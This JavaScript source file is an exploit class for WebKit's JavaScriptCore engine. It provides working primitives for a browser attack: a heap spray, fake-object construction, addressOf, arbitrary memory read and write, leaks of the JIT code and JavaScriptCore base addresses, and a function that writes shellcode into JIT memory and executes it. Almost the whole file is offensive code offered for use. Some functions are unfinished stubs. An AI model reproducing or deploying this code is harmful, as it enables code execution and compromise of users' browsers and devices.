import BaseExploit from "baseexploit";
import Integer from "integer";

/**
 * Constructs an exploit with sensible defaults for Webkit. Child must call initChrome method with a successfully an object that's successfully misaligned.
 *
 * @augments BaseExploit
 * @class
 * @constructor
 */
function WebkitExploit() {
    var exploit = this;
    BaseExploit.call(this, 64);

    this.broughtToYouBy = 'Externalist';
    this.pressure = new Array(100);
    this.master = new Uint32Array(0x1000);
    this.slave = new Uint32Array(0x1000);
    this.leakval_u32 = new Uint32Array(0x1000);
    this.leakval_helper = [this.slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
    this.misalign_object = {'a':this.u2d(2048, 0x602300), 'b':this.u2d(0,0), 'c':this.leakval_helper, 'd':this.u2d(0x1337,0)};
    this.butterfly = 0;
    this.addr_to_slavebuf = 0;

    function makeid() {
        var text = "";
        var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

        for (var i = 0; i < 8; i++)
            text += possible.charAt(Math.floor(Math.random() * possible.length));

        return text;
    };

    this.instancespr = [];
    for (var i = 0; i < 4096; i++) {
        this.instancespr[i] = new Uint32Array(1);
        this.instancespr[i][makeid()] = 50057; /* spray 4-field Object InstanceIDs */
    }
}
WebkitExploit.prototype = Object.create(BaseExploit.prototype);
WebkitExploit.prototype.constructor = WebkitExploit;

// In case you want to invoke the Garbage Collector
WebkitExploit.prototype.dgc = function(){
    for (var i = 0; i < this.pressure.length; i++) {
        this.pressure[i] = new Uint32Array(0x10000);
    }
}

// Convert Uint64 into an equivalent Floating Point representation
WebkitExploit.prototype.u2d = function(low, hi) {
    var _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0, hi);
    _dview.setUint32(4, low);
    return _dview.getFloat64(0);
}

// The inverse of the above
WebkitExploit.prototype.d2u = function(d) {
    var _dview = new DataView(new ArrayBuffer(16));
    _dview.setFloat64(0, d);
    return { lo: _dview.getUint32(4), hi: _dview.getUint32(0) };    
}

// Be careful when using this. Looping intensively could summon the GC
WebkitExploit.prototype.sleep = function(milliseconds) {
    var start = new Date().getTime();
    while (new Date().getTime() < start + milliseconds);
}

/**
 * Initializes Webkit helpers using memory read and write.
 *
 * @param {Integer|Pointer} fake_object A successfully misaligned object
 */
WebkitExploit.prototype.initWebkit = function(fake_object) {
    this.misalign_object.c = this.leakval_helper;
    this.butterfly = new Integer(fake_object[2], fake_object[3], true);

    this.misalign_object.c = this.leakval_u32;
    var lkv_u32_old = new Integer(fake_object[4], fake_object[5], true);
    fake_object[4] = this.butterfly.low;
    fake_object[5] = this.butterfly.high;

    this.misalign_object.c = this.master;
    fake_object[4] = this.leakval_u32[0];
    fake_object[5] = this.leakval_u32[1];

    this.addr_to_slavebuf = new Integer(this.master[4], this.master[5], true);
    this.misalign_object.c = this.leakval_u32;
    fake_object[4] = lkv_u32_old.low;
    fake_object[5] = lkv_u32_old.high;

    // Don't let GC ruin the party :)
    fake_object = 0;
    this.misalign_object.c = 0;

    // Get the JIT code address from a function object
    var trycatch = "";
    for(var z=0; z<0x2000; z++) trycatch += "try{} catch(e){}; ";
    this.fc = new Function(trycatch);
    for(var z=0; z<1000; z++) {         // Don't loop too excessively, otherwise FTL will kick in and wipe out the address from the object and start to hardcode call destinations
        this.fc();
    }
    this.jitCode = this.Uint8Ptr.cast(this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.addressOf(this.fc))[3])[3])[2]);     // These indexs may change slightly from version to version. I remember one being 3-2-2 on a different version. It'd be better to implement a hueristic logic but whatever... :D

    // Get the JavaScriptCore library base address. I could have gone further all the way down to the dyld_shared_cache base but 'shared_region_check_np' has got me covered so I stop here :)
    var parseFloatAddress = this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.addressOf(parseFloat))[3])[7].and(new Integer(0xFFF, 0, true).not());
    while(this.read(parseFloatAddress, 32) != 0xfeedfacf) {
        parseFloatAddress = parseFloatAddress.sub(0x1000);
    }
    this.javaScriptCoreBase = parseFloatAddress;
}

// The arbitrary read function
WebkitExploit.prototype.read = function (address, size) {
    this.master[4] = address.low;
    this.master[5] = address.high;

    var rtv = new Integer(this.slave[0], this.slave[1], true, size);

    this.master[4] = this.addr_to_slavebuf.low;
    this.master[5] = this.addr_to_slavebuf.high;

    return rtv;
}

// The arbitrary write function
WebkitExploit.prototype.write = function (address, value, size) {
    this.master[4] = address.low;
    this.master[5] = address.high;

    switch (size) {
        case 8 : this.slave[0] = (this.slave[0] & 0xFFFFFF00) +  (value.low & 0xFF);
        case 16: this.slave[0] = (this.slave[0] & 0xFFFF0000) +  (value.low & 0xFFFF);
        case 32: this.slave[0] = value.low | 0;
        case 64: this.slave[0] = value.low; 
                 this.slave[1] = value.high;
    }

    this.master[4] = this.addr_to_slavebuf.low;
    this.master[5] = this.addr_to_slavebuf.high;
}

/**
 * Returns the address of a Javascript object.
 *
 * @param {*} obj Any Javascript object
 * @returns {Pointer}
 */
WebkitExploit.prototype.addressOf = function (obj) {
    this.leakval_helper[0] = obj;
    var rtv = this.read(this.butterfly, 64);
    this.write(this.butterfly, new Integer(0x41414141, 0xffff0000, true), 64);

    return rtv;
}

/**
 * Creates a fake Javascript object that lies in the address 'fakeObjectAddr'
 *
 * @param {*} fakeObjectAddr Address of a fake Javascript object
 * @returns {JSObject}
 */
WebkitExploit.prototype.createFakeObject = function (fakeObjectAddr) {
    this.write(this.butterfly, fakeObjectAddr);
    var rt = this.leakval_helper[0];
    this.write(this.butterfly, new int64(0x41414141, 0xffff0000));
    return rt;
}

/**
 * Returns the address of ArrayBuffer contents.
 *
 * @param {ArrayBuffer} ab ArrayBuffer
 * @returns {Pointer}
 */
WebkitExploit.prototype.addressOfArrayBuffer = function (ab) {
    var p = this.Uint64Ptr.cast(this.addressOf(ab));
    return p[2];
}

// Not really needed as of now. Just leaving an empty function here in case a need rises in the future
/**
 * Returns the address of a Javascript object. Internal.
 *
 * @param {*} obj Any Javascript object
 * @returns {Pointer}
 */
WebkitExploit.prototype.addressOfSlow = function (obj) {

}

// TODO
/**
 * Call a function pointer with the given arguments. Used internally by FunctionPointer.
 *
 * @param {Integer} address
 * @param {...Integer} args
 * @returns {Integer}
 */
WebkitExploit.prototype.call = function (address, ...args) {
    var self = this;
}

/**
 * Writes shellcode onto the JIT and call into it
 *
 * @param {Integer} shellcode
 */
WebkitExploit.prototype.writeAndCallJIT = function (shellcode) {
    for(var i=0; i<shellcode.length; i++){
        this.jitCode[i] = shellcode[i];
    }
    this.fc();
}

export default WebkitExploit;
